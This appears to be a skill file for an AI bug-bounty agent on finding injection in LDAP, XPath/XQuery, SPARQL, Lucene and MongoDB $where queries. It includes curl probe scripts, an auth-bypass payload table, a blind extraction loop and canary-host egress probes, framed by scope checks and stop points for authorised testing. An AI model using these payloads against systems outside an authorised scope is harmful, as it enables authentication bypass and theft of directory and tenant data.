---
name: zp-ldap-xpath
description: ZeroProtocol hunter for injection into query languages other than SQL - LDAP search filters and DNs, XPath and XQuery, SPARQL, Lucene and Elasticsearch query_string, and MongoDB $where. Use when a login, people-search, address-book, org-chart or faceted-search feature sits on a directory or XML store, when javax.naming or "Bad search filter" appears in a response, or when a tenant filter is built by string concatenation. None of these grammars has a comment token, so the proof is a balanced always-true expression next to a matched negative control.
---

# zp-ldap-xpath - no comment token, so balance it

**Phase:** 5 | **Gate:** **active.** `zp-scope check <target>` must exit 0 before any request.
Exit 1 refuse and name the pattern · 3 stop · 4 stop.

SQL lets you `--` the rest of the query away. LDAP, XPath, XQuery, SPARQL and Lucene do not - your
input has to leave the expression **syntactically whole** or the server throws a parse error instead
of executing. That constraint is also the detector: an **unbalanced** probe that errors next to a
**balanced always-true** probe that authenticates is the whole finding. Either half alone is a guess,
and a 500 on a stray `)` is a parse error, not a bypass.

---

## Procedure

**1. Fingerprint which language you are in.** Error strings decide, not the feature name.

```bash
H=target.tld
probe(){ curl -sk -o /tmp/zp.b -D /tmp/zp.h -w '%{http_code} %{size_download} %{time_total}\n' \
  --max-time 20 -X POST "https://$H/api/login" -H 'Content-Type: application/json' \
  --data-raw "$1"; }
probe '{"username":"zpuser","password":"wrong"}'                 # BASELINE - keep this line
probe '{"username":"zpuser)","password":"wrong"}'                # one unbalanced paren
grep -oiE 'javax\.naming[.A-Za-z]*|InvalidSearchFilterException|Bad search filter|ldap_search|com\.sun\.jndi[.A-Za-z]*|LDAP: error code [0-9]+|XPathException|XPTY[0-9]+|FORG[0-9]+|SaxonApiException|MalformedQueryException|QueryParsingException|parse_exception|failed to create query|SyntaxError: Unexpected' /tmp/zp.b
```

| Fingerprint | Language | Note |
|---|---|---|
| `javax.naming.*`, `InvalidSearchFilterException`, `Bad search filter`, `ldap_search()` | LDAP search filter | the classic |
| `LDAP: error code 49 - 80090308` | Active Directory bind failure | AD, not OpenLDAP - see the AD row below |
| `XPathException`, `XPTY0004`, `FORG0001`, `SaxonApiException`, `net.sf.saxon` | XPath 1.0/2.0 or XQuery | XML store |
| `MalformedQueryException`, `org.eclipse.rdf4j`, `Virtuoso 37000` | SPARQL | RDF endpoint |
| `parse_exception`, `QueryParsingException`, `failed to create query` | Lucene / Elasticsearch `query_string` | search box |
| `SyntaxError: Unexpected token`, `MongoError` on a JS string | MongoDB `$where` | operator injection belongs to `zp-sqli` |

**2. Find the asymmetry before you build anything.** Send each character raw and compare to baseline.

```bash
for c in ')' '(' '*' '\' '&' '|' '!' "'" ']' '}' '"' '/' '%00'; do
  printf '%-6s ' "$c"
  probe "$(python3 -c 'import json,sys;print(json.dumps({"username":"zpuser"+sys.argv[1],"password":"wrong"}))' "$c")"
done
```

A safe app escapes all of them and every line matches baseline. **One character that changes the
status, the length or the error while its balanced partner does not** is the injection point. Record
both lines - they are the report.

**3. Pin the context.** The payloads do not transfer between these, so guessing wastes the budget.

| Context | Your input lands in | Characters that matter |
|---|---|---|
| LDAP search filter | `(&(uid=X)(userPassword=Y))` | `* ( ) \ & \| !` and NUL |
| LDAP DN | `uid=X,ou=people,dc=corp` | `, = + " \ < > ; /` - and `*` is **not** a wildcard here |
| XPath predicate | `//user[name/text()='X']` | `' " ] [ ( ) \| and or` |
| XQuery FLWOR | `for $u in //user where $u/name='X'` | the above plus `{ } , ;` |
| SPARQL graph pattern | `{ ?s :name "X" }` | `" } { . ; UNION SERVICE` |
| Lucene `query_string` | `tenant:7 AND body:X` | `: ( ) " \| \| && ! ^ ~ * ?` |
| MongoDB `$where` string | `"this.name=='X'"` | `' " ) } ; + ` |

**4. Auth bypass - balanced, with a negative control in the same loop.** Count the parentheses of the
*resulting* filter, not of your payload. Assume `(&(uid=INPUT)(userPassword=PASS))` until an error
message shows you otherwise.

```bash
balance(){ python3 - "$1" <<'PY'
import sys
s=sys.argv[1]; d=0; esc=False
for ch in s:
    if esc: esc=False; continue
    if ch=='\\': esc=True
    elif ch=='(': d+=1
    elif ch==')': d-=1
print(f"{s!r:44} depth={d}", "BALANCED" if d==0 else "UNBALANCED - will parse-error")
PY
}
FILTER='(&(uid=%s)(userPassword=wrong))'
for p in 'zpuser)(|(uid=*' '*)(uid=*))(|(uid=*' 'zpuser)(!(userPassword=zpNOSUCHVALUE))' 'zpuser*' \
         'zpuser)(|(uid=zpNOSUCHUSER'; do
  balance "$(printf "$FILTER" "$p")"
  printf '  -> '; probe "$(python3 -c 'import json,sys;print(json.dumps({"username":sys.argv[1],"password":"wrong"}))' "$p")"
done
```

The last payload is the **negative control**: identically shaped, logically false. It must fail. If
true-shaped and false-shaped payloads both "succeed", the endpoint is broken, not injectable.

**5. Build a two-sided boolean oracle before extracting anything.** One-sided length diffing is the
main false positive in this class - WAF banners, CSRF tokens and the length of your own injected
character all move `size_download`.

```bash
oracle(){ curl -sk -o /dev/null -w '%{http_code}:%{size_download}' --max-time 20 \
  -X POST "https://$H/api/directory/search" -H 'Content-Type: application/json' \
  --data-raw "$(python3 -c 'import json,sys;print(json.dumps({"q":sys.argv[1]}))' "$1")"; }
T=$(oracle 'zpuser)(objectClass=*))(&(objectClass=zpVOID');   echo "TRUE  class $T"
F=$(oracle 'zpuser)(objectClass=zpVOID))(&(objectClass=zpVOID'); echo "FALSE class $F"
[ "$T" = "$F" ] && echo "no oracle on this field - try status code, a body marker string, or another endpoint"
```

Re-read the FALSE control between every round. A WAF that starts blocking looks exactly like a
permanent TRUE.

**6. Prove reach, then stop.** With a working oracle, confirm an attribute *exists* and recover a
value **only from an object you own**.

```bash
for a in uid cn mail memberOf description sAMAccountName userPrincipalName userPassword objectClass; do
  printf '%-20s %s\n' "$a" "$(oracle "zpuser)($a=*))(&(objectClass=zpVOID")"
done
# then, against YOUR OWN account only, four characters is enough to prove inference:
PRE=""; for pos in 1 2 3 4; do
  for c in {a..z} {0..9} '$' '.' '{' '}'; do
    [ "$(oracle "zpOWNACCOUNT)(description=$PRE$c*))(&(objectClass=zpVOID")" = "$T" ] \
      && { PRE="$PRE$c"; echo "[$pos] $PRE"; break; }
  done
done
```

Four recovered characters that reproduce three times is a proven oracle. A full directory dump is a
data breach you performed; the extra characters buy no severity and lose you the report.

**7. Validate the filter you inferred out-of-band, on a directory you are authorised for.** This is
how you show the grammar claim is right without hammering the target.

```bash
ldapsearch -x -H ldap://$OWN_LDAP -D "cn=zp,dc=lab,dc=local" -w "$PW" -b "dc=lab,dc=local" \
  '(&(uid=zpuser)(|(uid=*)))' uid cn
python3 - <<'PY'   # XPath: let a parser adjudicate locally, no target traffic
from xml.etree import ElementTree as ET
doc = ET.fromstring("<users><user><name>admin</name><pw>s3cret</pw></user></users>")
for expr in ["./user[name='admin'][pw='wrong']", "./user[name='admin' or '1'='1']"]:
    try: print(f"{expr:46} -> {[e.tag for e in doc.findall(expr)]}")
    except Exception as e: print(f"{expr:46} -> parse error {e}")
PY
```

`xml.etree` implements only a subset of XPath, so a parse error there is not proof the target
rejects it - it is a cheap way to check your brackets balance. `lxml` (`etree.XPath`) if installed
gives the full grammar; `xmllint --xpath '<expr>' file.xml` is the no-Python fallback.

**8. Out-of-band, where the language actually offers it.** LDAP filters have **no** outbound
primitive - do not promise one. These three do, and an OOB hit is decisive for a blind case.

| Language | OOB primitive | Reading |
|---|---|---|
| XQuery / XPath 2.0 | `fn:doc("http://zp91234.canary.example/x")` | server-side fetch. This is SSRF - `zp-ssrf` |
| SPARQL | `} UNION { SERVICE <http://zp91234.canary.example/> { ?s ?p ?o } } #` | federated query egress - `zp-ssrf` |
| XML store with a DTD reachable | external entity in the submitted document | that is `zp-xxe-lfi`, not this skill |

**9. Stop point for this class, and say it in the report.** You stop at an authenticated session on
an account you own, a two-sided oracle demonstrated on four characters, or a canary hit. You do
**not** dump the directory, read another employee's record, run XQuery Update (`insert node`,
`delete node`, `replace`) or SPARQL `INSERT DATA`/`DELETE WHERE`, iterate a username list into a
password spray, or run a busy-wait loop in `$where` - that is a DoS on the database process.

---

## Probes and payloads

| Payload | Language / context | Positive looks like |
|---|---|---|
| `zpuser)` | any LDAP filter | parse error or 500 **while** the balanced twin behaves normally |
| `zpuser*` | LDAP filter, lowest noise | a match for a user whose name you only prefixed |
| `zpuser)(\|(uid=*` | AND filter, close and OR-true | authenticated session, password ignored |
| `*)(uid=*))(\|(uid=*` | self-balancing classic | first directory entry returned - often an admin or service account |
| `zpuser)(!(userPassword=zpNOSUCHVALUE))` | AND NOT a value never set | always-true without a wildcard, survives naive `*` filtering |
| `zpuser\|)(\|(uid=*` and `%5c2a` / `%5c28` | escape-handling bugs | app un-escapes its own escape sequence |
| `printer)(uid=*` | OR filter (`(\|(type=printer)…)`) | user objects appear in a printer list - cross-class read |
| `zpuser)(objectClass=*))(&(objectClass=zpVOID` | blind TRUE control | the TRUE-class response shape |
| `zpuser)(objectClass=zpVOID))(&(objectClass=zpVOID` | blind FALSE control | must differ from TRUE, and keep differing |
| `admin%00` | C-backed server, filter truncation | password clause disappears |
| `zp,ou=admins,dc=corp` | LDAP **DN** context | the RDN moves you to another subtree; `*` does nothing here |
| `' or '1'='1` / `' or ''='` | XPath predicate | any record returned; still likely killed - see below |
| `zpuser' or 'a'='a` | XPath, quoting kept balanced | authenticated without a password |
| `x'] \| //user/* \| //user[name()='x` | blind XPath node dump | fields from outside the intended predicate appear |
| `*[contains(name(),'pass')]` | XPath node-name discovery | element names leak the schema |
| `") OR tenant:* OR ("` and `zpuser OR _exists_:apiKey` | Lucene / ES `query_string` | documents from another tenant, or a field the UI never shows |
| `*:*` in a supposedly scoped search box | Lucene | the scoping clause was concatenated, not `bool`-filtered |
| `" } UNION { ?s ?p ?o } #` | SPARQL graph pattern | triples outside the intended graph |
| `'; return true; var x='` / `'\|\|1==1\|\|'` | MongoDB `$where` **string** concat | every document matches. Operator form -> `zp-sqli` |

Optional tooling: `nuclei -u https://$H -tags ldap,xpath -rate-limit "$(zp-scope show --json | jq -r '.rate_limit_rps // 5')"`,
and `zp-proxy` to replay the app's real request rather than a hand-built one. Neither is required -
steps 2 and 4 are the technique, and a substring-matching scanner produces the first row below.

---

## Confirm or kill

| Evidence | Verdict |
|---|---|
| balanced always-true payload returns a **usable session** (cookie works on a post-login resource) **and** the unbalanced twin returns a parse error | **confirmed auth bypass.** Critical when the entry landed on is privileged |
| the same, but the identically-shaped **false** control also succeeds | not injection - a broken auth endpoint. File that instead, do not call it LDAP |
| a lone `)` yields 500 and nothing else ever changes | parse error only. **Killed** - the filter never executed your logic |
| two-sided oracle flips on demand, FALSE control still reads FALSE after each round, positives reproduce 3x | **confirmed blind injection.** Medium on its own, High once a sensitive attribute is reachable |
| oracle flips only on `size_download`, once, and the FALSE control drifted | length jitter or a WAF. Killed until reproduced with a status or body-marker oracle |
| `userPassword` `{SSHA}`/`{CRYPT}` readable on OpenLDAP / 389-DS | **confirmed credential exposure.** High. Recover enough to prove the read, never the whole hash set |
| the same claim against **Active Directory** | **impossible.** `unicodePwd` is write-only and no search returns it. Claiming it gets the report closed |
| AD `description`/`info` holding a plaintext secret, reached via injection | confirmed credential leak - the real AD win, alongside bypass |
| `sAMAccountName`/`memberOf` enumeration only | Medium-High. Report the enumeration; do **not** spray the list |
| cross-class read (user objects out of a printer search) | confirmed information disclosure. Severity from the attributes returned |
| XPath `' or '1'='1` "works" on a search box with no auth and no scoping | usually **killed** - you widened a public search. Real finding needs a crossed trust boundary |
| Lucene `*:*` returns other tenants' documents | **confirmed** cross-tenant read. High - this is the modern high-value case in this class |
| `fn:doc()` or SPARQL `SERVICE` reaches your canary | confirmed SSRF. File it under `zp-ssrf`, which outranks the injection |
| `$where` accepts injected JS | confirmed - but if operator injection (`$ne`, `$regex`) already worked, `zp-sqli` owns the report |
| the input is escaped (`\2a`, `\28`) or the app builds filters with an SDK (`Filter.createEqualityFilter`, `ldap3` parameterised) | correctly built. Killed |
| a scanner said "LDAP injection" and you have no matched pair of your own | unverified. Killed until you reproduce by hand |
| the directory or search cluster is a third party's, or the host is out of scope | not yours. Re-run `zp-scope check` |

Two honest notes. **Balanced-but-false is the commonest self-deception here** - always ship the
negative control line next to the positive. And an always-true filter returns the *first* matching
entry, which is often a service account with no interesting rights; check what you actually became
before writing "admin takeover".

---

## High-value patterns

- **Corporate SSO and intranet login on a directory backend** - legacy Java/Spring/PHP, filter built
  by concatenation, and a bypass lands you inside the perimeter. The Critical case in this class.
- **"Find a colleague", org chart, address book, `/people`, `/api/directory/search`** - a filter
  parameter that was never meant to be user-writable, and often no rate limit on it.
- **A faceted search where the tenant or ACL clause is concatenated into `query_string`** - one
  `) OR (` and you read another customer's documents. Far more common in 2026 than LDAP.
- **Elasticsearch `_search` proxied by the app** with the user's `q` pasted in; `_exists_:<field>`
  then enumerates fields the UI hides. Pair with `zp-api`.
- **AD `description` and `info` attributes** - administrators still stash passwords there, and a
  read of them is a direct credential leak with no cracking.
- **A SPARQL or RDF endpoint behind a "knowledge graph" feature** - `SERVICE` is an egress
  primitive most reviewers never look for.
- **XML-backed legacy config or auth** in an appliance or a bespoke B2B portal - XPath with no
  parameterisation, and `fn:doc()` for OOB if it is XPath 2.0 or XQuery.
- **A password field that is also concatenated** - the `userPassword` clause is tested far less than
  the username one, and it is the same code path.

---

## Pitfalls

- **Claiming AD password-hash extraction.** `unicodePwd` is never returned. This single error is the
  fastest way to be dismissed as someone who has not tested a directory.
- **Reporting a parse error as a bypass.** Unbalanced filter = the server refused to run it.
- **Skipping the negative control**, then reporting an endpoint that accepts everything.
- **Mixing up search-filter and DN context.** `*` is a wildcard in a filter and a literal in a DN;
  DN injection needs `, = + " \ < > ;` instead.
- **Reaching for XPath's comment token.** There is none, in XPath, XQuery, SPARQL or Lucene. Balance
  the expression or it will not run.
- **Letting your HTTP client re-encode the payload.** Use `--data-raw` / `--data-binary`;
  `--data-urlencode` will double-encode the `%00` and `%5c` probes that test escape handling.
- **Enumerating a directory and then spraying the usernames.** Credential guessing is out of scope
  in every program ZeroProtocol will ever touch, and it is the line between a report and an incident.
- **Extracting more than the oracle needs.** Four characters of your own record proves inference. A
  dump of employee PII is a breach notification with your name on it.
- **A busy-wait loop in `$where`, or an unbounded blind loop at full speed.** That is a DoS. Honour
  the program rate limit; the oracle is thousands of requests if you let it be.
- **XQuery Update or SPARQL `INSERT DATA`/`DELETE WHERE` "just to confirm".** Writes to a production
  store are not proof, they are damage.
- **Not naming the sink in the report.** "The filter is built with string concatenation at the
  `uid` clause, and an SDK escape function is the fix" is what gets it accepted and fixed.

---

## Hand off to

New host or directory discovered -> `zp-scope` before touching it. Confirmed bypass -> `zp-triage`
then `zp-report`. Session obtained -> `zp-authz` and `zp-idor` for what it now reaches, `zp-jwt-oauth`
if the directory backs SSO. `fn:doc()` / SPARQL `SERVICE` egress -> `zp-ssrf`. XML documents and
entities -> `zp-xxe-lfi`. `$where` and operator injection -> `zp-sqli`; template and expression
evaluation -> `zp-rce-ssti`. Search and directory endpoints you have not found -> `zp-content-discovery`,
and filter-building code in bundles -> `zp-js-secrets`. Source in hand -> `zp-code-audit` for the
sibling call sites. Cross-tenant reads via a search proxy -> `zp-api`, or `zp-graphql` if the search
resolver is GraphQL. Directory enumeration results -> `zp-info-disclosure`; identity-estate follow-up
under an explicit red-team engagement -> `zp-redteam-ad` or `zp-redteam-entra`. Prior art on the
program -> `zp-intel`. Replaying the app's real request -> `zp-proxy`.
